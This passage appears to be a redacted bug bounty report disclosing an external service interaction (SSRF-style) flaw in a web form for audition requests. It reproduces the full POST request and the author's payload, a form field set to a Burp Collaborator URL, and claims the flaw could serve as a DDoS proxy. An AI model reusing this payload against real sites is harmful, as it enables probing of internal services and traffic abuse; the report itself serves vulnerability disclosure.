Depending on the network architecture, \n16this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.\nhttps://portswigger.net/kb/issues/00300200_external-service-interaction-dns\nFull link : https://www.\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\nPOST Request :\nCode 377 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&MONTH=01&LNAME=frenchvlad&PHONE=555-555-0199&EDULVL=10&STATE=AL&EMAILFLAG=on&submitButton=Submit+Audition+Request&EMAIL=frenchvlad@example.com&ADD1=555-555-0199@frenchvlad.com&\u2588\u2588\u2588\u2588\u2588\u2588=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville&ADD2=555-555-0199@frenchvlad.com&INST1MOS=Bass+Guitar&CITY=Winterville&YEAR=2003&INST1YRS=2+TO+5&DAY=01&CITIZEN=R\nmy payload : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville\nProof (DNS) :\n\u2588\u2588\u2588\u2588\u2588\u2588\nProof (HTTP) :\n\u2588\u2588\u2588\u2588\u2588\nbest regards,\nfrenchvlad\nImpact\nWe can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too\n\n",
